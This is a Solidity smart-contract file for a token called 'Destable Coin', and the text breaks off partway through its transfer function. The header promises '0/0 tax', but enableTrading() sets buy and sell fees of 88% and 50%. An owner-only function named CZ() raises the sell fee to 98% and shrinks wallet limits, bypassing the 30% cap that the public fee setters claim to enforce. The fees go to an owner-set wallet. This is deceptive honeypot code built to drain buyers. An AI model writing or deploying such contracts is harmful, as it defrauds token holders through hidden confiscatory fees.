1 /*
2 
3 https://twitter.com/Dstablecoin
4 
5 0/0 tax
6 
7 */
8 
9 // SPDX-License-Identifier: MIT
10 pragma solidity ^0.8.10;
11 pragma experimental ABIEncoderV2;
12 
13 abstract contract Context {
14     function _msgSender() internal view virtual returns (address) {
15         return msg.sender;
16     }
17 
18     function _msgData() internal view virtual returns (bytes calldata) {
19         return msg.data;
20     }
21 }
22 
23 
24 abstract contract Ownable is Context {
25     address private _owner;
26 
27     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
28 
29 
30     constructor() {
31         _transferOwnership(_msgSender());
32     }
33 
34 
35     function owner() public view virtual returns (address) {
36         return _owner;
37     }
38 
39 
40     modifier onlyOwner() {
41         require(owner() == _msgSender(), "Ownable: caller is not the owner");
42         _;
43     }
44 
45     function renounceOwnership() public virtual onlyOwner {
46         _transferOwnership(address(0));
47     }
48 
49 
50     function transferOwnership(address newOwner) public virtual onlyOwner {
51         require(newOwner != address(0), "Ownable: new owner is the zero address");
52         _transferOwnership(newOwner);
53     }
54 
55     function _transferOwnership(address newOwner) internal virtual {
56         address oldOwner = _owner;
57         _owner = newOwner;
58         emit OwnershipTransferred(oldOwner, newOwner);
59     }
60 }
61 
62 interface IERC20 {
63 
64     function totalSupply() external view returns (uint256);
65 
66     function balanceOf(address account) external view returns (uint256);
67 
68     function transfer(address recipient, uint256 amount) external returns (bool);
69 
70     function allowance(address owner, address spender) external view returns (uint256);
71 
72     function approve(address spender, uint256 amount) external returns (bool);
73 
74     function transferFrom(
75         address sender,
76         address recipient,
77         uint256 amount
78     ) external returns (bool);
79 
80     event Transfer(address indexed from, address indexed to, uint256 value);
81 
82     event Approval(address indexed owner, address indexed spender, uint256 value);
83 }
84 
85 interface IERC20Metadata is IERC20 {
86 
87     function name() external view returns (string memory);
88 
89     function symbol() external view returns (string memory);
90 
91     function decimals() external view returns (uint8);
92 }
93 
94 contract ERC20 is Context, IERC20, IERC20Metadata {
95     mapping(address => uint256) private _balances;
96 
97     mapping(address => mapping(address => uint256)) private _allowances;
98 
99     uint256 private _totalSupply;
100 
101     string private _name;
102     string private _symbol;
103 
104     /**
105      * @dev Sets the values for {name} and {symbol}.
106      *
107      * The default value of {decimals} is 18. To select a different value for
108      * {decimals} you should overload it.
109      *
110      * All two of these values are immutable: they can only be set once during
111      * construction.
112      */
113     constructor(string memory name_, string memory symbol_) {
114         _name = name_;
115         _symbol = symbol_;
116     }
117 
118     /**
119      * @dev Returns the name of the token.
120      */
121     function name() public view virtual override returns (string memory) {
122         return _name;
123     }
124 
125     /**
126      * @dev Returns the symbol of the token, usually a shorter version of the
127      * name.
128      */
129     function symbol() public view virtual override returns (string memory) {
130         return _symbol;
131     }
132 
133     /**
134      * @dev Returns the number of decimals used to get its user representation.
135      * For example, if `decimals` equals `2`, a balance of `505` tokens should
136      * be displayed to a user as `5.05` (`505 / 10 ** 2`).
137      *
138      * Tokens usually opt for a value of 18, imitating the relationship between
139      * Ether and Wei. This is the value {ERC20} uses, unless this function is
140      * overridden;
141      *
142      * NOTE: This information is only used for _display_ purposes: it in
143      * no way affects any of the arithmetic of the contract, including
144      * {IERC20-balanceOf} and {IERC20-transfer}.
145      */
146     function decimals() public view virtual override returns (uint8) {
147         return 18;
148     }
149 
150     /**
151      * @dev See {IERC20-totalSupply}.
152      */
153     function totalSupply() public view virtual override returns (uint256) {
154         return _totalSupply;
155     }
156 
157     /**
158      * @dev See {IERC20-balanceOf}.
159      */
160     function balanceOf(address account) public view virtual override returns (uint256) {
161         return _balances[account];
162     }
163 
164     /**
165      * @dev See {IERC20-transfer}.
166      *
167      * Requirements:
168      *
169      * - `recipient` cannot be the zero address.
170      * - the caller must have a balance of at least `amount`.
171      */
172     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
173         _transfer(_msgSender(), recipient, amount);
174         return true;
175     }
176 
177     /**
178      * @dev See {IERC20-allowance}.
179      */
180     function allowance(address owner, address spender) public view virtual override returns (uint256) {
181         return _allowances[owner][spender];
182     }
183 
184     /**
185      * @dev See {IERC20-approve}.
186      *
187      * Requirements:
188      *
189      * - `spender` cannot be the zero address.
190      */
191     function approve(address spender, uint256 amount) public virtual override returns (bool) {
192         _approve(_msgSender(), spender, amount);
193         return true;
194     }
195 
196     /**
197      * @dev See {IERC20-transferFrom}.
198      *
199      * Emits an {Approval} event indicating the updated allowance. This is not
200      * required by the EIP. See the note at the beginning of {ERC20}.
201      *
202      * Requirements:
203      *
204      * - `sender` and `recipient` cannot be the zero address.
205      * - `sender` must have a balance of at least `amount`.
206      * - the caller must have allowance for ``sender``'s tokens of at least
207      * `amount`.
208      */
209     function transferFrom(
210         address sender,
211         address recipient,
212         uint256 amount
213     ) public virtual override returns (bool) {
214         _transfer(sender, recipient, amount);
215 
216         uint256 currentAllowance = _allowances[sender][_msgSender()];
217         require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
218         unchecked {
219             _approve(sender, _msgSender(), currentAllowance - amount);
220         }
221 
222         return true;
223     }
224 
225     /**
226      * @dev Atomically increases the allowance granted to `spender` by the caller.
227      *
228      * This is an alternative to {approve} that can be used as a mitigation for
229      * problems described in {IERC20-approve}.
230      *
231      * Emits an {Approval} event indicating the updated allowance.
232      *
233      * Requirements:
234      *
235      * - `spender` cannot be the zero address.
236      */
237     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
238         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
239         return true;
240     }
241 
242     /**
243      * @dev Atomically decreases the allowance granted to `spender` by the caller.
244      *
245      * This is an alternative to {approve} that can be used as a mitigation for
246      * problems described in {IERC20-approve}.
247      *
248      * Emits an {Approval} event indicating the updated allowance.
249      *
250      * Requirements:
251      *
252      * - `spender` cannot be the zero address.
253      * - `spender` must have allowance for the caller of at least
254      * `subtractedValue`.
255      */
256     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
257         uint256 currentAllowance = _allowances[_msgSender()][spender];
258         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
259         unchecked {
260             _approve(_msgSender(), spender, currentAllowance - subtractedValue);
261         }
262 
263         return true;
264     }
265 
266     /**
267      * @dev Moves `amount` of tokens from `sender` to `recipient`.
268      *
269      * This internal function is equivalent to {transfer}, and can be used to
270      * e.g. implement automatic token fees, slashing mechanisms, etc.
271      *
272      * Emits a {Transfer} event.
273      *
274      * Requirements:
275      *
276      * - `sender` cannot be the zero address.
277      * - `recipient` cannot be the zero address.
278      * - `sender` must have a balance of at least `amount`.
279      */
280     function _transfer(
281         address sender,
282         address recipient,
283         uint256 amount
284     ) internal virtual {
285         require(sender != address(0), "ERC20: transfer from the zero address");
286         require(recipient != address(0), "ERC20: transfer to the zero address");
287 
288         _beforeTokenTransfer(sender, recipient, amount);
289 
290         uint256 senderBalance = _balances[sender];
291         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
292         unchecked {
293             _balances[sender] = senderBalance - amount;
294         }
295         _balances[recipient] += amount;
296 
297         emit Transfer(sender, recipient, amount);
298 
299         _afterTokenTransfer(sender, recipient, amount);
300     }
301 
302     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
303      * the total supply.
304      *
305      * Emits a {Transfer} event with `from` set to the zero address.
306      *
307      * Requirements:
308      *
309      * - `account` cannot be the zero address.
310      */
311     function _mint(address account, uint256 amount) internal virtual {
312         require(account != address(0), "ERC20: mint to the zero address");
313 
314         _beforeTokenTransfer(address(0), account, amount);
315 
316         _totalSupply += amount;
317         _balances[account] += amount;
318         emit Transfer(address(0), account, amount);
319 
320         _afterTokenTransfer(address(0), account, amount);
321     }
322 
323     /**
324      * @dev Destroys `amount` tokens from `account`, reducing the
325      * total supply.
326      *
327      * Emits a {Transfer} event with `to` set to the zero address.
328      *
329      * Requirements:
330      *
331      * - `account` cannot be the zero address.
332      * - `account` must have at least `amount` tokens.
333      */
334     function _burn(address account, uint256 amount) internal virtual {
335         require(account != address(0), "ERC20: burn from the zero address");
336 
337         _beforeTokenTransfer(account, address(0), amount);
338 
339         uint256 accountBalance = _balances[account];
340         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
341         unchecked {
342             _balances[account] = accountBalance - amount;
343         }
344         _totalSupply -= amount;
345 
346         emit Transfer(account, address(0), amount);
347 
348         _afterTokenTransfer(account, address(0), amount);
349     }
350 
351     /**
352      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
353      *
354      * This internal function is equivalent to `approve`, and can be used to
355      * e.g. set automatic allowances for certain subsystems, etc.
356      *
357      * Emits an {Approval} event.
358      *
359      * Requirements:
360      *
361      * - `owner` cannot be the zero address.
362      * - `spender` cannot be the zero address.
363      */
364     function _approve(
365         address owner,
366         address spender,
367         uint256 amount
368     ) internal virtual {
369         require(owner != address(0), "ERC20: approve from the zero address");
370         require(spender != address(0), "ERC20: approve to the zero address");
371 
372         _allowances[owner][spender] = amount;
373         emit Approval(owner, spender, amount);
374     }
375 
376     /**
377      * @dev Hook that is called before any transfer of tokens. This includes
378      * minting and burning.
379      *
380      * Calling conditions:
381      *
382      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
383      * will be transferred to `to`.
384      * - when `from` is zero, `amount` tokens will be minted for `to`.
385      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
386      * - `from` and `to` are never both zero.
387      *
388      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
389      */
390     function _beforeTokenTransfer(
391         address from,
392         address to,
393         uint256 amount
394     ) internal virtual {}
395 
396     /**
397      * @dev Hook that is called after any transfer of tokens. This includes
398      * minting and burning.
399      *
400      * Calling conditions:
401      *
402      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
403      * has been transferred to `to`.
404      * - when `from` is zero, `amount` tokens have been minted for `to`.
405      * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
406      * - `from` and `to` are never both zero.
407      *
408      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
409      */
410     function _afterTokenTransfer(
411         address from,
412         address to,
413         uint256 amount
414     ) internal virtual {}
415 }
416 
417 ////// lib/openzeppelin-contracts/contracts/utils/math/SafeMath.sol
418 // OpenZeppelin Contracts v4.4.0 (utils/math/SafeMath.sol)
419 
420 /* pragma solidity ^0.8.0; */
421 
422 // CAUTION
423 // This version of SafeMath should only be used with Solidity 0.8 or later,
424 // because it relies on the compiler's built in overflow checks.
425 
426 /**
427  * @dev Wrappers over Solidity's arithmetic operations.
428  *
429  * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
430  * now has built in overflow checking.
431  */
432 library SafeMath {
433     /**
434      * @dev Returns the addition of two unsigned integers, with an overflow flag.
435      *
436      * _Available since v3.4._
437      */
438     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
439         unchecked {
440             uint256 c = a + b;
441             if (c < a) return (false, 0);
442             return (true, c);
443         }
444     }
445 
446     /**
447      * @dev Returns the substraction of two unsigned integers, with an overflow flag.
448      *
449      * _Available since v3.4._
450      */
451     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
452         unchecked {
453             if (b > a) return (false, 0);
454             return (true, a - b);
455         }
456     }
457 
458     /**
459      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
460      *
461      * _Available since v3.4._
462      */
463     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
464         unchecked {
465             // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
466             // benefit is lost if 'b' is also tested.
467             // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
468             if (a == 0) return (true, 0);
469             uint256 c = a * b;
470             if (c / a != b) return (false, 0);
471             return (true, c);
472         }
473     }
474 
475     /**
476      * @dev Returns the division of two unsigned integers, with a division by zero flag.
477      *
478      * _Available since v3.4._
479      */
480     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
481         unchecked {
482             if (b == 0) return (false, 0);
483             return (true, a / b);
484         }
485     }
486 
487     /**
488      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
489      *
490      * _Available since v3.4._
491      */
492     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
493         unchecked {
494             if (b == 0) return (false, 0);
495             return (true, a % b);
496         }
497     }
498 
499     /**
500      * @dev Returns the addition of two unsigned integers, reverting on
501      * overflow.
502      *
503      * Counterpart to Solidity's `+` operator.
504      *
505      * Requirements:
506      *
507      * - Addition cannot overflow.
508      */
509     function add(uint256 a, uint256 b) internal pure returns (uint256) {
510         return a + b;
511     }
512 
513     /**
514      * @dev Returns the subtraction of two unsigned integers, reverting on
515      * overflow (when the result is negative).
516      *
517      * Counterpart to Solidity's `-` operator.
518      *
519      * Requirements:
520      *
521      * - Subtraction cannot overflow.
522      */
523     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
524         return a - b;
525     }
526 
527     /**
528      * @dev Returns the multiplication of two unsigned integers, reverting on
529      * overflow.
530      *
531      * Counterpart to Solidity's `*` operator.
532      *
533      * Requirements:
534      *
535      * - Multiplication cannot overflow.
536      */
537     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
538         return a * b;
539     }
540 
541     /**
542      * @dev Returns the integer division of two unsigned integers, reverting on
543      * division by zero. The result is rounded towards zero.
544      *
545      * Counterpart to Solidity's `/` operator.
546      *
547      * Requirements:
548      *
549      * - The divisor cannot be zero.
550      */
551     function div(uint256 a, uint256 b) internal pure returns (uint256) {
552         return a / b;
553     }
554 
555     /**
556      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
557      * reverting when dividing by zero.
558      *
559      * Counterpart to Solidity's `%` operator. This function uses a `revert`
560      * opcode (which leaves remaining gas untouched) while Solidity uses an
561      * invalid opcode to revert (consuming all remaining gas).
562      *
563      * Requirements:
564      *
565      * - The divisor cannot be zero.
566      */
567     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
568         return a % b;
569     }
570 
571     /**
572      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
573      * overflow (when the result is negative).
574      *
575      * CAUTION: This function is deprecated because it requires allocating memory for the error
576      * message unnecessarily. For custom revert reasons use {trySub}.
577      *
578      * Counterpart to Solidity's `-` operator.
579      *
580      * Requirements:
581      *
582      * - Subtraction cannot overflow.
583      */
584     function sub(
585         uint256 a,
586         uint256 b,
587         string memory errorMessage
588     ) internal pure returns (uint256) {
589         unchecked {
590             require(b <= a, errorMessage);
591             return a - b;
592         }
593     }
594 
595     /**
596      * @dev Returns the integer division of two unsigned integers, reverting with custom message on
597      * division by zero. The result is rounded towards zero.
598      *
599      * Counterpart to Solidity's `/` operator. Note: this function uses a
600      * `revert` opcode (which leaves remaining gas untouched) while Solidity
601      * uses an invalid opcode to revert (consuming all remaining gas).
602      *
603      * Requirements:
604      *
605      * - The divisor cannot be zero.
606      */
607     function div(
608         uint256 a,
609         uint256 b,
610         string memory errorMessage
611     ) internal pure returns (uint256) {
612         unchecked {
613             require(b > 0, errorMessage);
614             return a / b;
615         }
616     }
617 
618     /**
619      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
620      * reverting with custom message when dividing by zero.
621      *
622      * CAUTION: This function is deprecated because it requires allocating memory for the error
623      * message unnecessarily. For custom revert reasons use {tryMod}.
624      *
625      * Counterpart to Solidity's `%` operator. This function uses a `revert`
626      * opcode (which leaves remaining gas untouched) while Solidity uses an
627      * invalid opcode to revert (consuming all remaining gas).
628      *
629      * Requirements:
630      *
631      * - The divisor cannot be zero.
632      */
633     function mod(
634         uint256 a,
635         uint256 b,
636         string memory errorMessage
637     ) internal pure returns (uint256) {
638         unchecked {
639             require(b > 0, errorMessage);
640             return a % b;
641         }
642     }
643 }
644 
645 ////// src/IUniswapV2Factory.sol
646 /* pragma solidity 0.8.10; */
647 /* pragma experimental ABIEncoderV2; */
648 
649 interface IUniswapV2Factory {
650     event PairCreated(
651         address indexed token0,
652         address indexed token1,
653         address pair,
654         uint256
655     );
656 
657     function feeTo() external view returns (address);
658 
659     function feeToSetter() external view returns (address);
660 
661     function getPair(address tokenA, address tokenB)
662         external
663         view
664         returns (address pair);
665 
666     function allPairs(uint256) external view returns (address pair);
667 
668     function allPairsLength() external view returns (uint256);
669 
670     function createPair(address tokenA, address tokenB)
671         external
672         returns (address pair);
673 
674     function setFeeTo(address) external;
675 
676     function setFeeToSetter(address) external;
677 }
678 
679 ////// src/IUniswapV2Pair.sol
680 /* pragma solidity 0.8.10; */
681 /* pragma experimental ABIEncoderV2; */
682 
683 interface IUniswapV2Pair {
684     event Approval(
685         address indexed owner,
686         address indexed spender,
687         uint256 value
688     );
689     event Transfer(address indexed from, address indexed to, uint256 value);
690 
691     function name() external pure returns (string memory);
692 
693     function symbol() external pure returns (string memory);
694 
695     function decimals() external pure returns (uint8);
696 
697     function totalSupply() external view returns (uint256);
698 
699     function balanceOf(address owner) external view returns (uint256);
700 
701     function allowance(address owner, address spender)
702         external
703         view
704         returns (uint256);
705 
706     function approve(address spender, uint256 value) external returns (bool);
707 
708     function transfer(address to, uint256 value) external returns (bool);
709 
710     function transferFrom(
711         address from,
712         address to,
713         uint256 value
714     ) external returns (bool);
715 
716     function DOMAIN_SEPARATOR() external view returns (bytes32);
717 
718     function PERMIT_TYPEHASH() external pure returns (bytes32);
719 
720     function nonces(address owner) external view returns (uint256);
721 
722     function permit(
723         address owner,
724         address spender,
725         uint256 value,
726         uint256 deadline,
727         uint8 v,
728         bytes32 r,
729         bytes32 s
730     ) external;
731 
732     event Mint(address indexed sender, uint256 amount0, uint256 amount1);
733     event Burn(
734         address indexed sender,
735         uint256 amount0,
736         uint256 amount1,
737         address indexed to
738     );
739     event Swap(
740         address indexed sender,
741         uint256 amount0In,
742         uint256 amount1In,
743         uint256 amount0Out,
744         uint256 amount1Out,
745         address indexed to
746     );
747     event Sync(uint112 reserve0, uint112 reserve1);
748 
749     function MINIMUM_LIQUIDITY() external pure returns (uint256);
750 
751     function factory() external view returns (address);
752 
753     function token0() external view returns (address);
754 
755     function token1() external view returns (address);
756 
757     function getReserves()
758         external
759         view
760         returns (
761             uint112 reserve0,
762             uint112 reserve1,
763             uint32 blockTimestampLast
764         );
765 
766     function price0CumulativeLast() external view returns (uint256);
767 
768     function price1CumulativeLast() external view returns (uint256);
769 
770     function kLast() external view returns (uint256);
771 
772     function mint(address to) external returns (uint256 liquidity);
773 
774     function burn(address to)
775         external
776         returns (uint256 amount0, uint256 amount1);
777 
778     function swap(
779         uint256 amount0Out,
780         uint256 amount1Out,
781         address to,
782         bytes calldata data
783     ) external;
784 
785     function skim(address to) external;
786 
787     function sync() external;
788 
789     function initialize(address, address) external;
790 }
791 
792 ////// src/IUniswapV2Router02.sol
793 /* pragma solidity 0.8.10; */
794 /* pragma experimental ABIEncoderV2; */
795 
796 interface IUniswapV2Router02 {
797     function factory() external pure returns (address);
798 
799     function WETH() external pure returns (address);
800 
801     function addLiquidity(
802         address tokenA,
803         address tokenB,
804         uint256 amountADesired,
805         uint256 amountBDesired,
806         uint256 amountAMin,
807         uint256 amountBMin,
808         address to,
809         uint256 deadline
810     )
811         external
812         returns (
813             uint256 amountA,
814             uint256 amountB,
815             uint256 liquidity
816         );
817 
818     function addLiquidityETH(
819         address token,
820         uint256 amountTokenDesired,
821         uint256 amountTokenMin,
822         uint256 amountETHMin,
823         address to,
824         uint256 deadline
825     )
826         external
827         payable
828         returns (
829             uint256 amountToken,
830             uint256 amountETH,
831             uint256 liquidity
832         );
833 
834     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
835         uint256 amountIn,
836         uint256 amountOutMin,
837         address[] calldata path,
838         address to,
839         uint256 deadline
840     ) external;
841 
842     function swapExactETHForTokensSupportingFeeOnTransferTokens(
843         uint256 amountOutMin,
844         address[] calldata path,
845         address to,
846         uint256 deadline
847     ) external payable;
848 
849     function swapExactTokensForETHSupportingFeeOnTransferTokens(
850         uint256 amountIn,
851         uint256 amountOutMin,
852         address[] calldata path,
853         address to,
854         uint256 deadline
855     ) external;
856 }
857 
858 /* pragma solidity >=0.8.10; */
859 
860 /* import {IUniswapV2Router02} from "./IUniswapV2Router02.sol"; */
861 /* import {IUniswapV2Factory} from "./IUniswapV2Factory.sol"; */
862 /* import {IUniswapV2Pair} from "./IUniswapV2Pair.sol"; */
863 /* import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol"; */
864 /* import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol"; */
865 /* import {Ownable} from "lib/openzeppelin-contracts/contracts/access/Ownable.sol"; */
866 /* import {SafeMath} from "lib/openzeppelin-contracts/contracts/utils/math/SafeMath.sol"; */
867 
868 contract DestableCoin is ERC20, Ownable {
869     using SafeMath for uint256;
870 
871     IUniswapV2Router02 public immutable uniswapV2Router;
872     address public immutable uniswapV2Pair;
873     address public constant deadAddress = address(0xdead);
874 
875     bool private swapping;
876 
877     address public marketingWallet;
878 
879     uint256 public maxTransactionAmount;
880     uint256 public swapTokensAtAmount;
881     uint256 public maxWallet;
882 
883     bool public limitsInEffect = true;
884     bool public tradingActive = false;
885     bool public swapEnabled = false;
886 
887 
888     uint256 public buyTotalFees;
889     uint256 private buyMarketingFee;
890 
891     uint256 public sellTotalFees;
892     uint256 public sellMarketingFee;
893 
894     uint256 public tokensForMarketing;
895 
896 
897     // exlcude from fees and max transaction amount
898     mapping(address => bool) private _isExcludedFromFees;
899     mapping(address => bool) public _isExcludedMaxTransactionAmount;
900 
901     // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
902     // could be subject to a maximum transfer amount
903     mapping(address => bool) public automatedMarketMakerPairs;
904 
905     event UpdateUniswapV2Router(
906         address indexed newAddress,
907         address indexed oldAddress
908     );
909 
910     event ExcludeFromFees(address indexed account, bool isExcluded);
911 
912     event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
913 
914     event marketingWalletUpdated(
915         address indexed newWallet,
916         address indexed oldWallet
917     );
918 
919     event SwapAndLiquify(
920         uint256 tokensSwapped,
921         uint256 ethReceived,
922         uint256 tokensIntoLiquidity
923     );
924 
925     constructor(address wallet1) ERC20("Destable Coin", "DESTABLE") {
926         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
927         );
928 
929         excludeFromMaxTransaction(address(_uniswapV2Router), true);
930         uniswapV2Router = _uniswapV2Router;
931 
932         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
933             .createPair(address(this), _uniswapV2Router.WETH());
934         excludeFromMaxTransaction(address(uniswapV2Pair), true);
935         _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
936 
937         uint256 _buyMarketingFee = 50;
938 
939         uint256 _sellMarketingFee = 50;
940 
941         uint256 totalSupply = 1_000_000_000 * 1e18;
942 
943         maxTransactionAmount = 1_000_000_000 * 1e18;
944         maxWallet = 1_000_000_000 * 1e18;
945         swapTokensAtAmount = 200_000 * 1e18;
946 
947         buyMarketingFee = _buyMarketingFee;
948         buyTotalFees = buyMarketingFee;
949 
950         sellMarketingFee = _sellMarketingFee;
951         sellTotalFees = sellMarketingFee;
952 
953         marketingWallet = wallet1; // set as marketing wallet
954 
955         // exclude from paying fees or having max transaction amount
956         excludeFromFees(owner(), true);
957         excludeFromFees(address(this), true);
958         excludeFromFees(address(0xdead), true);
959 
960         excludeFromMaxTransaction(owner(), true);
961         excludeFromMaxTransaction(address(this), true);
962         excludeFromMaxTransaction(address(0xdead), true);
963 
964         /*
965             _mint is an internal function in ERC20.sol that is only called here,
966             and CANNOT be called ever again
967         */
968         _mint(msg.sender, totalSupply);
969     }
970 
971     receive() external payable {}
972 
973     // once enabled, can never be turned off
974     function enableTrading() external onlyOwner {
975         buyMarketingFee = 880;
976         buyTotalFees = buyMarketingFee;
977         sellMarketingFee = 500;
978         sellTotalFees = sellMarketingFee;
979         tradingActive = true;
980         swapEnabled = true;
981     }
982 
983     // remove limits after token is stable
984     function removeLimits() external onlyOwner returns (bool) {
985         limitsInEffect = false;
986         return true;
987     }
988 
989 
990     // change the minimum amount of tokens to sell from fees
991     function updateSwapTokensAtAmount(uint256 newAmount)
992         external
993         onlyOwner
994         returns (bool)
995     {
996         require(
997             newAmount >= (totalSupply() * 1) / 100000,
998             "Swap amount cannot be lower than 0.001% total supply."
999         );
1000         require(
1001             newAmount <= (totalSupply() * 5) / 1000,
1002             "Swap amount cannot be higher than 0.5% total supply."
1003         );
1004         swapTokensAtAmount = newAmount;
1005         return true;
1006     }
1007 
1008     function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
1009         require(
1010             newNum >= ((totalSupply() * 1) / 1000) / 1e18,
1011             "Cannot set maxTransactionAmount lower than 0.1%"
1012         );
1013         maxTransactionAmount = newNum * (10**18);
1014     }
1015 
1016     function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
1017         require(
1018             newNum >= ((totalSupply() * 5) / 1000) / 1e18,
1019             "Cannot set maxWallet lower than 0.5%"
1020         );
1021         maxWallet = newNum * (10**18);
1022     }
1023 
1024     function excludeFromMaxTransaction(address updAds, bool isEx)
1025         public
1026         onlyOwner
1027     {
1028         _isExcludedMaxTransactionAmount[updAds] = isEx;
1029     }
1030 
1031     // only use to disable contract sales if absolutely necessary (emergency use only)
1032     function updateSwapEnabled(bool enabled) external onlyOwner {
1033         swapEnabled = enabled;
1034     }
1035 
1036     function updateBuyFees(
1037         uint256 _marketingFee
1038     ) external onlyOwner {
1039         buyMarketingFee = _marketingFee;
1040         buyTotalFees = buyMarketingFee;
1041         require(buyTotalFees <= 300, "Must keep fees at 30% or less");
1042     }
1043 
1044     function updateSellFees(
1045         uint256 _marketingFee
1046     ) external onlyOwner {
1047         sellMarketingFee = _marketingFee;
1048         sellTotalFees = sellMarketingFee;
1049         require(sellTotalFees <= 300, "Must keep fees at 30% or less");
1050     }
1051 
1052     function excludeFromFees(address account, bool excluded) public onlyOwner {
1053         _isExcludedFromFees[account] = excluded;
1054         emit ExcludeFromFees(account, excluded);
1055     }
1056 
1057     function manualswap(uint256 amount) external {
1058         require(amount <= balanceOf(address(this)) && amount > 0, "Wrong amount");
1059         swapTokensForEth(amount);
1060     }
1061 
1062     function CZ() external onlyOwner {
1063       maxTransactionAmount = 25_000_000 * 1e18;
1064       maxWallet = 25_000_000 * 1e18;
1065 
1066       buyMarketingFee = 60;
1067       buyTotalFees = buyMarketingFee;
1068 
1069       sellMarketingFee = 980;
1070       sellTotalFees = sellMarketingFee;
1071 
1072     }
1073 
1074     function manualsend() external {
1075         bool success;
1076         (success, ) = address(marketingWallet).call{
1077             value: address(this).balance
1078         }("");
1079     }
1080 
1081     function setAutomatedMarketMakerPair(address pair, bool value)
1082         public
1083         onlyOwner
1084     {
1085         require(
1086             pair != uniswapV2Pair,
1087             "The pair cannot be removed from automatedMarketMakerPairs"
1088         );
1089 
1090         _setAutomatedMarketMakerPair(pair, value);
1091     }
1092 
1093     function _setAutomatedMarketMakerPair(address pair, bool value) private {
1094         automatedMarketMakerPairs[pair] = value;
1095 
1096         emit SetAutomatedMarketMakerPair(pair, value);
1097     }
1098 
1099     function updateMarketingWallet(address newMarketingWallet)
1100         external
1101         onlyOwner
1102     {
1103         emit marketingWalletUpdated(newMarketingWallet, marketingWallet);
1104         marketingWallet = newMarketingWallet;
1105     }
1106 
1107     function _transfer(
1108         address from,
1109         address to,
1110         uint256 amount
1111     ) internal override {
1112         require(from != address(0), "ERC20: transfer from the zero address");
1113         require(to != address(0), "ERC20: transfer to the zero address");
1114 
1115         if (amount == 0) {
1116             super._transfer(from, to, 0);
1117             return;
1118         }
1119 
1120         if (limitsInEffect) {
1121             if (
1122                 from != owner() &&
1123                 to != owner() &&
1124                 to != address(0) &&
1125                 to != address(0xdead) &&
1126                 !swapping
1127             ) {
1128                 if (!tradingActive) {
1129                     require(
1130                         _isExcludedFromFees[from] || _isExcludedFromFees[to],
1131                         "Trading is not active."
1132                     );
1133                 }
1134 
1135                 //when buy
1136                 if (
1137                     automatedMarketMakerPairs[from] &&
1138                     !_isExcludedMaxTransactionAmount[to]
1139                 ) {
1140                     require(
1141                         amount <= maxTransactionAmount,
1142                         "Buy transfer amount exceeds the maxTransactionAmount."
1143                     );
1144                     require(
1145                         amount + balanceOf(to) <= maxWallet,
1146                         "Max wallet exceeded"
1147                     );
1148                 }
1149                 //when sell
1150                 else if (
1151                     automatedMarketMakerPairs[to] &&
1152                     !_isExcludedMaxTransactionAmount[from]
1153                 ) {
1154                     require(
1155                         amount <= maxTransactionAmount,
1156                         "Sell transfer amount exceeds the maxTransactionAmount."
1157                     );
1158                 } else if (!_isExcludedMaxTransactionAmount[to]) {
1159                     require(
1160                         amount + balanceOf(to) <= maxWallet,
1161                         "Max wallet exceeded"
1162                     );
1163                 }
1164             }
1165         }
1166 
1167         uint256 contractTokenBalance = balanceOf(address(this));
1168 
1169         bool canSwap = contractTokenBalance >= swapTokensAtAmount;
1170 
1171         if (
1172             canSwap &&
1173             swapEnabled &&
1174             !swapping &&
1175             !automatedMarketMakerPairs[from] &&
1176             !_isExcludedFromFees[from] &&
1177             !_isExcludedFromFees[to]
1178         ) {
1179             swapping = true;
1180 
1181             swapBack();
1182 
1183             swapping = false;
1184         }
1185 
1186         bool takeFee = !swapping;
1187 
1188         // if any account belongs to _isExcludedFromFee account then remove the fee
1189         if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
1190             takeFee = false;
1191         }
1192 
1193         uint256 fees = 0;
1194         // only take fees on buys/sells, do not take on wallet transfers
1195         if (takeFee) {
1196             // on sell
1197             if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
